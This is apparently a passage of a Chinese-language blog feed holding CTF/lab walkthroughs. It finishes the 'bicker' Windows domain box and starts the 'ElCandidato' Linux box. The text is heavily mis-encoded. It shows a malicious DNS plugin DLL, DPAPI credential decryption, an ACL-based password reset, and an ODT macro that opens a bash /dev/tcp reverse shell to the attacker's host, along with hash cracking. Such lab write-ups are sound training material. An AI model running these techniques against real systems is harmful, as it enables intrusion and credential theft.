    Âú® `tindalos` ÁöÑ Shell ‰∏≠Ôºå‰ªé Kali ‰∏ãËΩΩÊ≠§ DLLÔºåÂπ∂‰ΩøÁî® `dnscmd.exe` Â∞ÜÂÖ∂Ê≥®ÂÜå‰∏∫ `ServerLevelPluginDll`„ÄÇ
    ```powershell
    *Evil-WinRM* PS C:\Users\tindalos\Documents&gt; Invoke-WebRequest -Uri 'http://192.168.205.128/dns.dll' -OutFile 'C:\Users\tindalos\Documents\dns.dll'
    
    *Evil-WinRM* PS C:\Users\tindalos\Documents&gt; dnscmd.exe localhost /config /serverlevelplugindll C:\Users\tindalos\Documents\dns.dll
    
    Ê≥®ÂÜåÂ±ûÊÄß serverlevelplugindll ÊàêÂäüÈáçÁΩÆ„ÄÇ
    ÂëΩ‰ª§ÊàêÂäüÂÆåÊàê„ÄÇ
    ```
*   **ÁõëÂê¨Âπ∂ÔºàÊ®°ÊãüÔºâÈáçÂêØ**
    Âú® Kali ‰∏äÂºÄÂêØÁõëÂê¨„ÄÇÊ≠§Êó∂ÔºåÈÄöËøáËôöÊãüÂåñÁÆ°ÁêÜÂπ≥Âè∞ÈáçÂêØÁõÆÊ†áÊúçÂä°Âô®ÔºåÂç≥ÂèØËß¶Âèë DLL Âä†ËΩΩ„ÄÇ
    
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
    ‚îî‚îÄ$ nc -lvnp 8888                                                 
    listening on [any] 8888 ...
    connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 62282
    Microsoft Windows [ÔøΩÊ±æ 10.0.20348.169]
    (c) Microsoft CorporationÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ»®ÔøΩÔøΩÔøΩÔøΩ
    
    C:\Windows\system32&gt;whoami
    nt authority\system
    ```
    Ê≠§Ë∑ØÂæÑËôΩÁÑ∂ÂèØË°åÔºå‰ΩÜÁªïËøá‰∫ÜÈù∂Êú∫ËÆæËÆ°ÁöÑÊ†∏ÂøÉÊåëÊàò„ÄÇ

## 4. ÊèêÊùÉË∑ØÂæÑ‰∫åÔºöÈ¢ÑÊúüËß£ÔºàÁ≤æÂáÜÊùÉÈôêÂà©Áî®Ôºâ

ËøôÊù°Ë∑ØÂæÑËÄÉÈ™åÁöÑÊòØÂú®ÂèóÈôêÁéØÂ¢É‰∏ãÁöÑÊ∑±Â∫¶‰ø°ÊÅØÊåñÊéòÂíåÊ®™ÂêëÁßªÂä®ËÉΩÂäõÔºåÊòØÊõ¥‰∏∫‰∏ì‰∏öÂíåÈöêËîΩÁöÑÊâãÊ≥ï„ÄÇ

### 4.1. Êú¨Âú∞Âá≠ÊçÆÊåñÊéò

*   **Êûö‰∏æÂüüÁî®Êà∑**
    ‰∏∫ËßÑÂàíÊ®™ÂêëÁßªÂä®Ë∑ØÂæÑÔºåÊàë‰ª¨Êûö‰∏æÂüüÂÜÖÁöÑÂÖ∂‰ªñÁî®Êà∑ÂèäÂÖ∂ÁªÑÂÖ≥Á≥ª„ÄÇ
    ```powershell
    *Evil-WinRM* PS C:\Users\tindalos\Documents&gt; net user jianyin /domain
    ...
    ÂÖ®Â±ÄÁªÑÊàêÂëò             *Domain Users         *DNSRestarters
    *Evil-WinRM* PS C:\Users\tindalos\Documents&gt; net user lihua /domain
    ...
    ÂÖ®Â±ÄÁªÑÊàêÂëò             *Domain Users         *AccountModifier
    ```
    ÂèëÁé∞‰∫Ü‰∏§‰∏™ÂÖ≥ÈîÆÁöÑËá™ÂÆö‰πâÁªÑÔºö`DNSRestarters` Âíå `AccountModifier`„ÄÇ
*   **ÁªïËøá Windows Defender**
    Â∞ùËØïÊâßË°å`Seatbelt.exe`Ë¢´ Defender Êã¶Êà™„ÄÇÈÄöËøáÊé¢Á¥¢ÂèëÁé∞ `C:\wirteTEMP` ÊòØ‰∏Ä‰∏™ÁôΩÂêçÂçïÁõÆÂΩïÔºåÂêéÁª≠Â∑•ÂÖ∑ÂùáÂú®Ê≠§ÁõÆÂΩï‰∏ãÊâßË°å„ÄÇ
*   **Âà©Áî® DPAPI Ëß£ÂØÜÂá≠ÊçÆ**
    **ÊäÄÊúØËÉåÊôØ**ÔºöWindows ‰ΩøÁî®Êï∞ÊçÆ‰øùÊä§ API (DPAPI) Êù•Âä†ÂØÜÂ≠òÂÇ®Âú®Áî®Êà∑ÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑÊïèÊÑü‰ø°ÊÅØ„ÄÇÁî±‰∫éÊàë‰ª¨Â∑≤Áü• `tindalos` ÁöÑÊòéÊñáÂØÜÁ†ÅÔºåÂèØ‰ª•Ëß£ÂØÜÂÖ∂ DPAPI ‰∏ªÂØÜÈí•ÔºåËøõËÄåËß£ÂØÜÁî±ÂÆÉ‰øùÊä§ÁöÑÂÖ∂‰ªñÂá≠ÊçÆ„ÄÇ
    ```powershell
    *Evil-WinRM* PS C:\wirteTEMP&gt; Invoke-WebRequest -Uri 'http://192.168.205.128/SharpDPAPI.exe' -OutFile 'C:\wirteTEMP\SharpDPAPI.exe'
    *Evil-WinRM* PS C:\wirteTEMP&gt; ./SharpDPAPI.exe credentials /unprotect /credfile:'C:\Users\tindalos\AppData\Roaming\Microsoft\Credentials\A2E4656BCBABFD9279E090E8482A7141' /sid:S-1-5-21-298176814-2846777796-698167141-1103 /password:'Th3C@ll0fCtHu1hu!'
    ...
      CredFile           : A2E4656BCBABFD9279E090E8482A7141
        ...
        UserName         : lihua
        Credential       : hello%2633
    ...
    ```
    ÊâßË°åÊàêÂäüÔºÅÊàë‰ª¨‰ªé `tindalos` ÁöÑÊú¨Âú∞Â≠òÂÇ®‰∏≠ÔºåËß£ÂØÜÂá∫‰∫ÜÂè¶‰∏Ä‰ΩçÁî®Êà∑ `lihua` ÁöÑÊòéÊñáÂØÜÁ†ÅÔºö`hello%2633`„ÄÇ

### 4.2. Ê®™ÂêëÁßªÂä®‰∏é ACL Ê∑±Â∫¶Êûö‰∏æ

Ëé∑Âæó‰∫Ü `lihua` ÁöÑÂá≠ÊçÆÔºåÊàë‰ª¨Á´ãÂç≥Ê®™ÂêëÁßªÂä®Âà∞ËØ•Áî®Êà∑ÁöÑ‰ºöËØù‰∏≠ÔºåÂπ∂Ê∑±ÂÖ•ÊåñÊéòÂÖ∂ÊâÄÂ±ûÁöÑ `AccountModifier` ÁªÑÂà∞Â∫ïÊã•Êúâ‰ΩïÁßçÊùÉÈôê„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ evil-winrm -i 192.168.205.149 -u 'lihua' -p 'hello%2633'
...
*Evil-WinRM* PS C:\Users\lihua\Documents&gt; whoami
bicker\lihua
```
‰∏∫‰∫ÜÁ≤æÁ°ÆÊûö‰∏æ Active Directory ÁöÑËÆøÈóÆÊéßÂà∂ÂàóË°® (ACL)ÔºåÊàë‰ª¨‰∏ä‰º†Âπ∂Âä†ËΩΩÂº∫Â§ßÁöÑ `PowerView.ps1` ËÑöÊú¨„ÄÇ

```powershell
*Evil-WinRM* PS C:\wirteTEMP&gt; Invoke-WebRequest -Uri 'http://192.168.205.128/PowerView.ps1' -OutFile 'C:\wirteTEMP\pv.ps1'

*Evil-WinRM* PS C:\wirteTEMP&gt; . .\pv.ps1
```
Âä†ËΩΩÂêéÔºåÊàë‰ª¨‰ΩøÁî® PowerView Êü•ËØ¢ `AccountModifier` ÁªÑÂÖ∑‰ΩìÂØπ `jianyin` Áî®Êà∑Êã•ÊúâÂì™‰∫õÊùÉÈôê„ÄÇ

```powershell
*Evil-WinRM* PS C:\wirteTEMP&gt; Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ObjectDN -match 'jianyin' } | Format-List *

ObjectDN                : CN=jianyin,CN=Users,DC=bicker,DC=com
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : User-Force-Change-Password
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-298176814-2846777796-698167141-2107
IdentityReferenceName   : AccountModifier
IdentityReferenceDomain : bicker.com
IdentityReferenceDN     : CN=AccountModifier,CN=Users,DC=bicker,DC=com
IdentityReferenceClass  : group
```
**ÂàÜÊûêÁªìÊûú**ÔºöËæìÂá∫ÊûÅ‰∏∫Á≤æÁ°ÆÂú∞ÂëäËØâÊàë‰ª¨Ôºå`AccountModifier` ÁªÑÂØπ `jianyin` Áî®Êà∑ÂØπË±°Êã•ÊúâÁöÑÂπ∂ÈùûÈÄöÁî®ÂÜôÂÖ•ÊùÉÔºåËÄåÊòØ‰∏ÄÈ°πÁâπÂÆöÁöÑ**Êâ©Â±ïÊùÉÈôê (Extended Right)**Ôºö`User-Force-Change-Password`„ÄÇ

### 4.3. Á≤æÂáÜÂà©Áî® ACL ÊéßÂà∂Áî®Êà∑

Ë¶ÅÂà©Áî®Ëøô‰∏ÄÁâπÂÆöÁöÑÂßîÊ¥æÊùÉÈôêÔºåÂøÖÈ°ª‰ΩøÁî®ËÉΩÂ§üË∞ÉÁî®Áõ∏Â∫î ADSI Êé•Âè£ÁöÑÂ∑•ÂÖ∑„ÄÇPowerView ÁöÑ `Set-DomainUserPassword` ÂáΩÊï∞Ê≠£ÊòØ‰∏∫Ê≠§ËÆæËÆ°ÁöÑ„ÄÇ

*   **Â§ÑÁêÜ `SecureString`**
    **ÊäÄÊúØËÉåÊôØ**Ôºö‰∏∫ÂÆâÂÖ®Ëµ∑ËßÅÔºåÁé∞‰ª£ PowerShell cmdlet ÈÄöÂ∏∏Ë¶ÅÊ±ÇÂØÜÁ†ÅÂèÇÊï∞‰∏∫ `SecureString` Á±ªÂûãÔºåËøôÊòØ‰∏ÄÁßçÂú®ÂÜÖÂ≠ò‰∏≠Âä†ÂØÜÂ≠òÂÇ®ÁöÑÂ≠óÁ¨¶‰∏≤ÂØπË±°„ÄÇÊàë‰ª¨ÈúÄË¶ÅÂÖàÂ∞ÜÊòéÊñáÂØÜÁ†ÅËøõË°åËΩ¨Êç¢„ÄÇ
    ```powershell
    *Evil-WinRM* PS C:\wirteTEMP&gt; $SecurePassword = ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
    ```
*   **ÈáçÁΩÆÂØÜÁ†Å**
    Áé∞Âú®ÔºåÊàë‰ª¨ÂèØ‰ª•Ë∞ÉÁî®ÂáΩÊï∞ÔºåÂπ∂‰º†ÂÖ•ËΩ¨Êç¢ÂêéÁöÑ `SecureString` ÂØπË±°„ÄÇ
    ```powershell
    *Evil-WinRM* PS C:\wirteTEMP&gt; Set-DomainUserPassword -Identity jianyin -AccountPassword $SecurePassword -Verbose
    Verbose: [Set-DomainUserPassword] Attempting to set the password for user 'jianyin'
    Verbose: [Set-DomainUserPassword] Password for user 'jianyin' successfully reset
    ```
    ÂëΩ‰ª§ÊàêÂäüÊâßË°åÔºåÊàë‰ª¨Â∑≤ÂÆåÂÖ®ÊéßÂà∂ `jianyin` Ë¥¶Êà∑„ÄÇ

### 4.4. Ëß¶ÂèëÊºèÊ¥ûÔºåËé∑Âèñ SYSTEM ÊùÉÈôê

Ëá≥Ê≠§ÔºåÊâÄÊúâÊãºÂõæÈÉΩÂ∑≤ÈõÜÈΩêÔºö`tindalos` ÊîæÁΩÆ‰∫ÜÂêéÈó®Ôºå`lihua` Â∏ÆÂä©Êàë‰ª¨ÊéßÂà∂‰∫Ü `jianyin`ÔºåËÄå `jianyin` Ê≠£ÊòØÈÇ£‰∏™Êã•Êúâ‚ÄúÂºïÁàÜ‚ÄùÊùÉÈôêÁöÑ‰∫∫„ÄÇ

*   **‰ΩøÁî®Êñ∞Âá≠ÊçÆÁôªÂΩï**
    Êàë‰ª¨Áé∞Âú®‰ª• `jianyin` ÁöÑË∫´‰ªΩÁôªÂΩïÔºå‰ªñÁöÑÂØÜÁ†ÅÂ∑≤Ë¢´Êàë‰ª¨ÈáçÁΩÆ‰∏∫ `P@ssword123!`„ÄÇ
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
    ‚îî‚îÄ$ evil-winrm -i 192.168.205.149 -u 'jianyin' -p 'P@ssword123!'
    ...
    *Evil-WinRM* PS C:\Users\jianyin\Documents&gt; whoami
    bicker\jianyin
    ```
*   **ÂáÜÂ§áÁõëÂê¨Âπ∂ÈáçÂêØÊúçÂä°**
    Âú® Kali ‰∏äÂºÄÂêØ Netcat ÁõëÂê¨ÔºåÂáÜÂ§áÊé•Êî∂ÂèçÂºπ Shell„ÄÇÁÑ∂ÂêéÂú® `jianyin` ÁöÑ‰ºöËØù‰∏≠ÔºåÊâßË°åÈáçÂêØ DNS ÊúçÂä°ÁöÑÂëΩ‰ª§„ÄÇ
    ```bash
    # Âú® Kali ÁªàÁ´Ø
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
    ‚îî‚îÄ$ nc -lvnp 8888
    listening on [any] 8888 ...
    ```
    ```powershell
    # Âú® jianyin ÁöÑ evil-winrm shell ‰∏≠
    *Evil-WinRM* PS C:\Users\jianyin\Documents&gt; Restart-Service DNS
    ```
*   **Êé•Êî∂ ShellÔºåÊèêÊùÉÊàêÂäü**
    DNS ÊúçÂä°ÈáçÂêØÊó∂ÔºåÂä†ËΩΩ‰∫ÜÊàë‰ª¨È¢ÑÂÖàËÆæÁΩÆÁöÑÊÅ∂ÊÑè DLL„ÄÇKali ÁöÑÁõëÂê¨Á™óÂè£ÊàêÂäüÊé•Êî∂Âà∞ËøûÊé•ÔºåÊàë‰ª¨Ëé∑Âæó‰∫Ü‰∏Ä‰∏™ `NT AUTHORITY\SYSTEM` ÊùÉÈôêÁöÑ shell„ÄÇ
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
    ‚îî‚îÄ$ nc -lvnp 8888
    listening on [any] 8888 ...
    connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 58463
    Microsoft Windows [ÔøΩÊ±æ 10.0.20348.169]
    (c) Microsoft CorporationÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ»®ÔøΩÔøΩÔøΩÔøΩ
    
    C:\Windows\system32&gt;whoami
    nt authority\system
    ```

# **Âõõ„ÄÅÂ§∫ÂèñÂá≠ËØÅ**

Ëé∑ÂæóÂüüÊéßÁöÑÊúÄÈ´òÊùÉÈôêÂêéÔºåÊàë‰ª¨Áõ¥Êé•ËøõÂÖ•ÁÆ°ÁêÜÂëòÊ°åÈù¢ÔºåÊü•ÊâæÂπ∂ËØªÂèñÊúÄÁªàÁöÑ flag„ÄÇ

```
C:\Windows\system32&gt;cd C:\Users\Administrator\Desktop\

C:\Users\Administrator\Desktop&gt;dir
 ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ C ÔøΩ–µƒæÔøΩ√ªÔøΩ–±ÔøΩ«©ÔøΩÔøΩ
 ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ–∫ÔøΩÔøΩÔøΩ D05C-A317

 C:\Users\Administrator\Desktop ÔøΩÔøΩƒø¬º

2025/08/15  18:36    &lt;DIR&gt;          .
2025/08/15  16:59    &lt;DIR&gt;          ..
2025/08/15  17:06             2,288 Microsoft Edge.lnk
2025/08/15  18:37                54 root.txt
               2 ÔøΩÔøΩÔøΩƒºÔøΩ          2,342 ÔøΩ÷ΩÔøΩ
               2 ÔøΩÔøΩƒø¬º 38,144,806,912 ÔøΩÔøΩÔøΩÔøΩÔøΩ÷ΩÔøΩ

C:\Users\Administrator\Desktop&gt;type root.txt
root{7c1e4b8a2d6f3b9c5e0a}
```
ÊàêÂäüËé∑Âèñ root flagÔºåÊú¨Ê¨°Ê∏óÈÄèÊµãËØïÂúÜÊª°ÁªìÊùü„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_bicker.html</guid><pubDate>Sun, 17 Aug 2025 03:01:08 +0000</pubDate></item><item><title>thl_ElCandidato</title><link>https://7r1UMPHK.github.io/post/thl_ElCandidato.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºåÂú®ÂΩìÂâçÁΩëÊÆµÂÜÖËøõË°å‰∏ªÊú∫ÂèëÁé∞ÔºåÁ°ÆÂÆöÁõÆÊ†áÈù∂Êú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ‰ΩøÁî®`arp-scan`Â∑•ÂÖ∑Êâ´ÊèèÊú¨Âú∞ÁΩëÁªú„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.131 08:00:27:71:8b:9b       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e9:a7:63       VMware, Inc.
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.131`„ÄÇ

## 2. Á´ØÂè£Êâ´Êèè

Á°ÆËÆ§ÁõÆÊ†áIPÂêéÔºå‰ΩøÁî®`nmap`ÂØπÁõÆÊ†áËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•Êé¢ÊµãÂÖ∂ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.131                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 21:52 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00021s latency).
Not shown: 65527 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s
MAC Address: 08:00:27:71:8B:9B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds
```

Êâ´ÊèèÂèëÁé∞ÁõÆÊ†áÂºÄÊîæ‰∫ÜÂ§ö‰∏™Á´ØÂè£ÔºåÂåÖÊã¨`22 (SSH)`„ÄÅ`80 (HTTP)`„ÄÅ`445 (SMB)`‰ª•ÂèäÂ§ö‰∏™ÈÇÆ‰ª∂ÊúçÂä°Á´ØÂè£„ÄÇÊàë‰ª¨È¶ñÂÖà‰ªéÊúÄÂÆπÊòìËé∑Âèñ‰ø°ÊÅØÁöÑHTTPÊúçÂä°ÂÖ•Êâã„ÄÇ

## 3. Web‰ø°ÊÅØÊé¢Êµã

ËÆøÈóÆ`http://192.168.205.131`ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™ÊãõËÅòÁΩëÁ´ô„ÄÇÂú®ÊµèËßàÁΩëÁ´ôÂÜÖÂÆπÊó∂ÔºåÊ≥®ÊÑèÂà∞ÂÖ∂ÈìæÊé•ÊåáÂêë‰∫Ü‰∏Ä‰∏™ÂüüÂêç `gyhabogados.thl`„ÄÇ‰∏∫‰∫ÜÊñπ‰æøÂêéÁª≠ÁöÑÊé¢ÊµãÔºåÂ∞ÜÂÖ∂Ê∑ªÂä†Âà∞Êú¨Âú∞`/etc/hosts`Êñá‰ª∂„ÄÇ

```bash
# Â∞Ü‰ª•‰∏ãË°åÊ∑ªÂä†Âà∞ /etc/hosts Êñá‰ª∂
192.168.205.131 gyhabogados.thl
```

**Â≠êÂüüÂêçÁàÜÁ†¥**

Áî±‰∫éÂèëÁé∞‰∫ÜÈÇÆ‰ª∂ÊúçÂä°Á´ØÂè£ÔºåÊé®ÊµãÂèØËÉΩÂ≠òÂú®Â¶Ç`mail`‰πãÁ±ªÁöÑÂ≠êÂüüÂêç„ÄÇ‰ΩøÁî®`wfuzz`ÁªìÂêà`HOST`Â§¥ÂØπÂ≠êÂüüÂêçËøõË°åÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ wfuzz -c -u 'http://gyhabogados.thl' -H 'HOST:FUZZ.gyhabogados.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 671
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                          
=====================================================================
000000002:   200        96 L     343 W      5580 Ch     'mail - mail' 
...
```

ÊàêÂäüÂèëÁé∞Â≠êÂüüÂêç `mail.gyhabogados.thl`ÔºåÂêåÊ†∑Â∞ÜÂÖ∂Ê∑ªÂä†Âà∞`/etc/hosts`Êñá‰ª∂„ÄÇ

**ÁõÆÂΩïÊâ´Êèè**

Êé•ÁùÄ‰ΩøÁî®`gobuster`ÂØπ‰∏ªÁ´ôËøõË°åÁõÆÂΩïÊâ´ÊèèÔºåÂØªÊâæÂèØÂà©Áî®ÁöÑË∑ØÂæÑÊàñÊñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://gyhabogados.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/uploads              (Status: 301) [Size: 320] [--&gt; http://gyhabogados.thl/uploads/]
/images               (Status: 301) [Size: 319] [--&gt; http://gyhabogados.thl/images/]
/index.php            (Status: 200) [Size: 7760]
/config               (Status: 301) [Size: 319] [--&gt; http://gyhabogados.thl/config/]
/roundcube            (Status: 301) [Size: 322] [--&gt; http://gyhabogados.thl/roundcube/]
...
```

Êâ´ÊèèÁªìÊûú‰∏≠ÔºåÊàë‰ª¨ÂèëÁé∞‰∫Ü‰∏Ä‰∫õÂÖ≥ÈîÆÁõÆÂΩïÔºåÂ¶Ç `/uploads`„ÄÅ`/config`Ôºå‰ª•Âèä‰∏Ä‰∏™WebmailÁ≥ªÁªü `/roundcube`„ÄÇ

# ‰∫å„ÄÅÊºèÊ¥ûÂà©Áî®‰∏éÂàùÊ≠•ËÆøÈóÆ

ÈáçÊñ∞ËÆøÈóÆÁΩëÁ´ôÔºåÂú®`http://gyhabogados.thl/work-with-us.php`È°µÈù¢ÂèëÁé∞‰∫Ü‰∏Ä‰∏™Êñá‰ª∂‰∏ä‰º†ÂäüËÉΩÔºåÂÖÅËÆ∏Ê±ÇËÅåËÄÖ‰∏ä‰º†ÁÆÄÂéÜ„ÄÇÊµãËØïÂèëÁé∞ËØ•ÂäüËÉΩ‰ºº‰πé‰ºöÂØπÊñáÊ°£Êñá‰ª∂ËøõË°åÂ§ÑÁêÜÔºåËøôÂèØËÉΩÊòØ‰∏Ä‰∏™ÊîªÂáªÂÖ•Âè£„ÄÇ

Êàë‰ª¨Â∞ùËØïÊûÑÈÄ†‰∏Ä‰∏™ÂåÖÂê´ÂèçÂêëShellÂÆèÁöÑ`.odt`ÔºàOpenDocument TextÔºâÊñá‰ª∂„ÄÇÂΩìÊúçÂä°Âô®Á´ØÂ∫îÁî®ÔºàÂ¶ÇLibreOfficeÔºâÊâìÂºÄÊ≠§Êñá‰ª∂‰ª•Ëß£ÊûêÂÖ∂ÂÜÖÂÆπÊó∂ÔºåÂèØËÉΩ‰ºöËá™Âä®ÊâßË°åÂÆèÔºå‰ªéËÄåËß¶ÂèëÊàë‰ª¨ÁöÑPayload„ÄÇ

**ÂÆèÂà∂‰Ωú**

1. Âú®LibreOffice Writer‰∏≠ÔºåÈÄöËøá `Â∑•ÂÖ∑ -&gt; ÂÆè -&gt; ÁÆ°ÁêÜÂÆè -&gt; Basic` ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÂÆè„ÄÇ

2. ÂÜôÂÖ•Áî®‰∫éÂàõÂª∫ÂèçÂêëShellÁöÑBasicËÑöÊú¨‰ª£Á†Å„ÄÇ‰ª•‰∏ã‰∏∫Á§∫‰æãÔºö

   ```basic
   Sub Main
       Dim command as String
       command = 'bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1''
       Shell(command)
   End Sub
   ```

3. Â∞ÜÊ≠§ÂÆèÁªëÂÆöÂà∞ÊñáÊ°£ÁöÑ‚ÄúÊâìÂºÄÊñáÊ°£‚Äù‰∫ã‰ª∂‰∏äÔºåÂπ∂‰øùÂ≠ò‰∏∫`.odt`Ê†ºÂºè„ÄÇ

**Ëé∑ÂèñShell**

Âú®Kali‰∏äËÆæÁΩÆ`netcat`ÁõëÂê¨8888Á´ØÂè£ÔºåÁÑ∂ÂêéÈÄöËøáÁΩëÁ´ô‰∏ä‰º†ÊûÑÈÄ†Â•ΩÁöÑ`.odt`Êñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888                 
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 55862
bash: cannot set terminal process group (2362): Inappropriate ioctl for device
bash: no job control in this shell
bash: /home/bob/.bashrc: Permission denied
bob@TheHackersLabs-Gyhabogados:~$ id
uid=1000(bob) gid=1000(bob) groups=1000(bob),27(sudo),100(users)
```

ÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπShellÔºåÂΩìÂâçÁî®Êà∑‰∏∫`bob`„ÄÇ

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. ShellÁ®≥ÂÆöÂåñ

‰∏∫‰∫ÜÊõ¥Â•ΩÁöÑ‰∫§‰∫í‰ΩìÈ™åÔºå‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§Â∫èÂàóÂ∞ÜÁÆÄÊòìShellÂçáÁ∫ß‰∏∫ÂäüËÉΩÂÆåÊï¥ÁöÑTTY„ÄÇ

```bash
script /dev/null -c bash
# Êåâ‰∏ã Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

## 2. bob -&gt; sam

Âú®‰πãÂâçÁõÆÂΩïÊâ´ÊèèÂèëÁé∞ÁöÑ `/config` ÁõÆÂΩï‰∏≠ÔºåÊü•ÊâæÊïèÊÑü‰ø°ÊÅØ„ÄÇ

```bash
bob@TheHackersLabs-Gyhabogados:/var/www/html/config$ cat db.php 
&lt;?php

$mysqli = mysqli_connect('127.0.0.1', 'bob', 'sup3rS3cretP4ssword_2024!', 'candidatos');

if (mysqli_error($mysqli)) {
  die('Ocurrio un error al conectarse a la base de datos ' . mysqli_error($mysqli));
}
```

ÂèëÁé∞‰∫ÜÊï∞ÊçÆÂ∫ìÂá≠ÊçÆ `bob:sup3rS3cretP4ssword_2024!`„ÄÇÂ∞ùËØï‰ΩøÁî®ËØ•ÂØÜÁ†ÅÂàáÊç¢Áî®Êà∑ÊàñÊâßË°åsudoÔºå‰ΩÜÂùáÂ§±Ë¥•„ÄÇ

ÂõûÂà∞`bob`Áî®Êà∑ÁöÑ‰∏ªÁõÆÂΩïÔºåÂèëÁé∞‰∏Ä‰∏™Âä†ÂØÜÁöÑ7zÂéãÁº©Êñá‰ª∂ `credentials.7z`„ÄÇ

```bash
bob@TheHackersLabs-Gyhabogados:~$ ls
credentials.7z
```

‰ΩøÁî®`scp`Â∞ÜÂÖ∂‰º†ËæìÂõûKaliËøõË°åÁ†¥Ëß£„ÄÇ

```bash
bob@TheHackersLabs-Gyhabogados:~$ scp credentials.7z kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
```

Âú®Kali‰∏äÔºå‰ΩøÁî®`7z2john`ÊèêÂèñÂìàÂ∏åÔºåÁÑ∂ÂêéÁî®`john`Âíå`rockyou.txt`Â≠óÂÖ∏ËøõË°åÁ†¥Ëß£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z2john credentials.7z &gt; hash
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
barcelona        (credentials.7z)     
...
```

ÂØÜÁ†ÅÊàêÂäüÁ†¥Ëß£‰∏∫ `barcelona`„ÄÇËß£ÂéãÊñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x credentials.7z
...
Enter password (will not be echoed):
...
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat credentials.txt
bob:a7gyqqp6bt2!uv@2u
```

ÂæóÂà∞‰∏ÄÂØπÊñ∞Âá≠ÊçÆ `bob:a7gyqqp6bt2!uv@2u`„ÄÇÁªìÂêà‰πãÂâçÂèëÁé∞ÁöÑwebmailÁ≥ªÁªüÔºà`http://mail.gyhabogados.thl/roundcube/`ÔºâÔºå‰ΩøÁî®Ê≠§Âá≠ÊçÆÁôªÂΩï`bob`ÁöÑÈÇÆÁÆ±„ÄÇ

